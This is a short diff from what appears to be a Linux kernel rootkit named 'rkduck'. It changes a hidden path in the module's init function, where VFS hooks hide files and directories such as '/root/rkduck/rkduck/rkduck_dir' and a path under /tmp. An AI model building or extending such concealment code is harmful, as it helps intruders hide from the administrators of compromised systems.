@@ -17,7 +17,7 @@ int duck_init(void) {
     // set_page_ro((ptr_t) sys_call_table);
 
     vfs_hide_file("/root/rkduck/rkduck/rkduck_dir");
-    vfs_hide_file(str_remove_duplicates("///tmp////"));
+    vfs_hide_file(str_remove_duplicates("///tmp////rklol"));
     // vfs_hide_file(str_remove_duplicates("/tmp"));
     printk("rkduck: %s\n", str_remove_duplicates("///tmp////"));
     
